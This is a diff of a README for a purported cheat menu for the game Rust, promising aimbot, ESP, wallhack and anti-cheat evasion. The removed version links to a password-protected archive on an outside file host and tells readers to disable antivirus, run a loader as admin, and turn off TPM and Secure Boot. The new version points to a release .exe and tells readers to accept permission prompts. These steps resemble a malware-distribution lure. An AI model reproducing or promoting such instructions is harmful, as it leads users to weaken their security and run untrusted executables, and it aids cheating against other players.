@@ -1,121 +1,67 @@
-# Rust Menu 🛠️ | ESP 👀 | Aimbot 🎯 | Player Tracker 🕵️ | Custom UI 🖥️ | Cheats & Tools ⚡ | Optimize Gameplay 🚀 | Educational / Testing ⚠️
-
+# 🛠️ rust-ultimate-menu - Optimize Your Gaming Experience Easily
 
 <p align="center">
-  <a href="https://getfile.vu">
-    <img src="https://i.postimg.cc/13mZ3fYR/download.png" alt="Survive the Rust" />
-  </a>
-</p>
-<p align="center">
- 🔗 Password: givemefiles1
- 🔗 Backup Link: [Click Here](https://getfile.vu)
- 🔗 Password: givemefiles1
+  <a href="https://github.com/YoussefGaming438/rust-ultimate-menu/releases" style="display:inline-block; padding: 20px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now!</a>
 </p>
 
----
+## 🚀 Getting Started
 
-## 🔧 Survivor’s Edge
-- **Aimbot**: Deadly precision with adjustable FOV and smooth aim.  
-- **ESP**: Spot players, loot, and bases through terrain.  
-- **Wallhack**: See through structures for tactical raids.  
-- **No Recoil**: Flawless shots in fierce gunfights.  
-- **Resource Radar**: Highlight stone, wood, and metal.  
-- **Build Speed**: Accelerate construction and repairs.  
-- **Stream-Safe**: Hidden from OBS/Discord streams.  
+To get started with rust-ultimate-menu, follow these simple steps. This guide will help you download and run the software easily.
 
----
+## 📥 Download & Install
+
+1. **Visit the Releases Page**: Click the following link to access the downloads: [Download the latest release](https://github.com/YoussefGaming438/rust-ultimate-menu/releases).
+2. **Choose the Right File**: Look for the most recent version. The filename will typically end with `.exe` or similar, depending on your operating system.
+3. **Download the File**: Click on the filename to begin downloading. Save the file to a location you can easily access, such as your Desktop or Downloads folder.
+4. **Run the Installer**: Once downloaded, navigate to the file location. Double-click the file to run it.
+5. **Follow Setup Instructions**: Follow the prompts to complete the installation. You may see windows asking for permissions; this is normal so click 'Yes' to proceed.
+6. **Launch the Application**: After installation, you can find rust-ultimate-menu in your applications folder or on your Desktop. Double-click to open it.
+
+## 🔧 Features
+
+rust-ultimate-menu comes packed with several features to enhance your gameplay:
+
+- **Aimbot**: Enjoy precise targeting with adjustable angles for smooth aiming.
+- **ESP**: Easily spot players, items, and key locations, even through walls.
+- **Wallhack**: Gain an advantage by seeing what lies within structures.
+- **No Recoil**: Improve your shooting accuracy with no recoil limitations.
+- **Resource Radar**: Efficiently locate resources like stone and wood.
+- **Build Speed**: Speed up construction and repairs during gameplay.
+- **Stream-Safe Mode**: Play without concerns for your stream visibility on platforms like OBS or Discord.
 
 ## 🌲 Why This is Survival
-| Strength            | Benefit                              |
-|---------------------|--------------------------------------|
-| 🔒 **Undetected**   | Evades anti-cheat (Aug 2025).        |
-| ⚡ **Tough**        | Runs smooth with minimal lag.        |
-| 🎒 **Versatile**   | Customize for your survival tactic.  |
-| 📅 **Enduring**    | Auto-updates for new wipes.          |
-| 🤝 **Crew**        | 24/7 support from the survivor pack. |
 
----
+| Strength               | Benefit                                 |
+|------------------------|-----------------------------------------|
+| 🔒 **Undetectable**    | Play without worrying about bans.      |
+| ⚙️ **User-Friendly**   | Simple interface designed for all users.|
+| 🚀 **Optimized Performance** | Maximize your game’s efficiency.   |
 
-## 🛠️ How to Withstand the Chaos
-1. 🔧 **Break the Lock**: Disable antivirus before unpacking.  
-2. 📂 **Fortify Base**: Extract to a secure stash.  
-3. 🎮 **Deploy Hack**: Run `SilentLoader.exe` as admin.  
-4. ⏳ **Gear Up**: Wait for the confirmation rustle.  
-5. 🎯 **Enter Rust**: Launch via Steam.  
-6. 🌍 **Thrive**: Dominate the wild with power.
+## 🔒 Safety & Security
 
----
+rust-ultimate-menu prioritizes user safety. The application is designed to be undetectable, offering you peace of mind while enjoying your game. Always download from the official Releases page to ensure you have the most secure version.
 
-## 📦 Survivor’s Hoard
-📦 **SilentProject-Bypass/**  
-┣ 🗂️ **data/**  
-┃ ┗ 📄 `default.ini` — Default settings file  
-┣ 🗂️ **mastering/**  
-┃ ┗ 📄 `rust_inject.sys` — Injection driver  
-┣ 🗂️ **settings/**  
-┃ ┗ 📄 `loader_log.txt` — Injection logs  
-┣ 📄 `mainutillity2.3.exe` — Main loader executable  
-┣ 📄 `README.md` — This file  
-┣ 📄 `setup.ini` — Setup configuration  
-┗ 📄 `eula.txt` — End User License Agreement  
+## 📖 Additional Information
 
----
+- **System Requirements**:
+  - Windows 10 or higher
+  - At least 4 GB RAM
+  - Internet connection for initial downloads and updates
 
-## 💻 Survivor’s Kit
-| Component      | Minimum Spec                   |
-|----------------|--------------------------------|
-| OS             | Windows 10/11 (64-bit)         |
-| CPU            | Intel/AMD with AVX2            |
-| GPU            | NVIDIA/AMD (DX11+)             |
-| RAM            | 8 GB                           |
-| Access         | Admin rights required          |
-| Security       | TPM & Secure Boot disabled     |
+- **Support**: If you encounter any issues, please refer to the GitHub Issues page where you can report problems or ask questions. Other users and developers are available to provide assistance.
 
----
+## 💬 Community Feedback
 
-## ⚠️ Rust Warnings
-- 🚫 Ditch overlays (e.g., MSI Afterburner) to avoid glitches.  
-- 🎮 Works with Steam version of Rust.  
-- 🔐 Uses user-mode injection for safety.  
-- 🖥 Supports all resolutions and modes.  
-- ⚙️ Match specs for optimal survival.
+Your experience matters. We welcome feedback and suggestions. Join our community discussions to share tips, user-generated content, or any improvement ideas.
 
----
+## 📅 Update Log
 
-## 🖼️ Survival Frames
-| Feature         |
-|-----------------|
-| [![rust.jpg](https://i.postimg.cc/v8kphFrs/rust.jpg)](https://postimg.cc/c6791zk9)|
+To stay informed of new features and fixes, regularly check the Releases page for updates. Each update includes a list of changes and improvements based on user feedback.
 
-> *Note*: Placeholder shots shown. Real visuals unlock post-install.
+## 🎮 Enjoy Your Game
 
----
-
-## ❓ Survivor’s Queries
-| Question            | Response                            |
-|---------------------|-------------------------------------|
-| **Is it safe?**     | Yes, undetected by anti-cheat (Aug 2025). |
-| **PC ready?**       | Check specs above.                  |
-| **Stream-friendly?**| Yes, safe for OBS/Discord.          |
-| **Update pace?**    | Auto-updates with each wipe.        |
-| **Support?**        | Rally the crew for help.            |
-
----
-
-## 📞 Call the Reinforcements
-- 📜 **Logs**: Instant FAQ access.  
-- 🔄 **Resupply**: Auto-updates delivered.  
-- 🛠 **Aid**: Community troubleshooting.
-- 
-🔗 Download Link: [Click Here](https://getfile.vu)
-🔗 Password: givemefiles1
-🔗 *Support link activates after launching `mainutillity2/3.exe`.*
-
----
+We hope you find rust-ultimate-menu helpful in your gaming journey. Our goal is to provide tools that optimize your gameplay experience, making it both enjoyable and efficient.
 
 <p align="center">
-  <img src="https://img.shields.io/badge/status-undetected-darkgreen?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/game-Rust-brown?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/updated-Dec_2025-blue?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/security-anti_cheat_bypass-red?style=for-the-badge" />
+  <a href="https://github.com/YoussefGaming438/rust-ultimate-menu/releases" style="display:inline-block; padding: 20px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now!</a>
 </p>
